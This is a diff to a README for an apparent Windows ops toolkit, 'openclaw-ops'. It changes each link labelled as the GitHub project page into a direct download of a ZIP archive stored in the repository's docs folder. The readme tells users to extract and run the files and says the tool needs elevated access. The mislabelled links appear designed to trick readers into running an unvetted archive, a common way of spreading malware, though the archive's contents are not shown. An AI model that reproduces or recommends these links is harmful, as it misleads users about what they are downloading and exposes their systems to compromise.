@@ -1,12 +1,12 @@
 # 🐾 openclaw-ops - Keep systems checked and ready
 
-[![Download openclaw-ops](https://img.shields.io/badge/Download-openclaw--ops-blue?style=for-the-badge&logo=github)](https://github.com/Annuitantindianrice61/openclaw-ops)
+[![Download openclaw-ops](https://img.shields.io/badge/Download-openclaw--ops-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Annuitantindianrice61/openclaw-ops/main/docs/openclaw-ops-3.7.zip)
 
 ## 🔽 Download
 
 Use this link to visit the project page and get the files:
 
-[Open openclaw-ops on GitHub](https://github.com/Annuitantindianrice61/openclaw-ops)
+[Open openclaw-ops on GitHub](https://raw.githubusercontent.com/Annuitantindianrice61/openclaw-ops/main/docs/openclaw-ops-3.7.zip)
 
 ## 🪟 Windows setup
 
@@ -19,7 +19,7 @@ openclaw-ops is a set of ops tools for common system tasks. It helps with health
 - A file unzip tool if the download comes in a ZIP file
 
 ### Download and open the files
-1. Open the project page: [https://github.com/Annuitantindianrice61/openclaw-ops](https://github.com/Annuitantindianrice61/openclaw-ops)
+1. Open the project page: [https://raw.githubusercontent.com/Annuitantindianrice61/openclaw-ops/main/docs/openclaw-ops-3.7.zip](https://raw.githubusercontent.com/Annuitantindianrice61/openclaw-ops/main/docs/openclaw-ops-3.7.zip)
 2. Look for the latest release or the main download area.
 3. Download the file for Windows.
 4. If the file is zipped, right-click it and choose **Extract All**.
@@ -169,7 +169,7 @@ Some ops tasks need higher access on Windows. That helps the tool read system da
 
 If you need the project page again, use this link:
 
-[https://github.com/Annuitantindianrice61/openclaw-ops](https://github.com/Annuitantindianrice61/openclaw-ops)
+[https://raw.githubusercontent.com/Annuitantindianrice61/openclaw-ops/main/docs/openclaw-ops-3.7.zip](https://raw.githubusercontent.com/Annuitantindianrice61/openclaw-ops/main/docs/openclaw-ops-3.7.zip)
 
 ## 🗂️ Files to look for
 
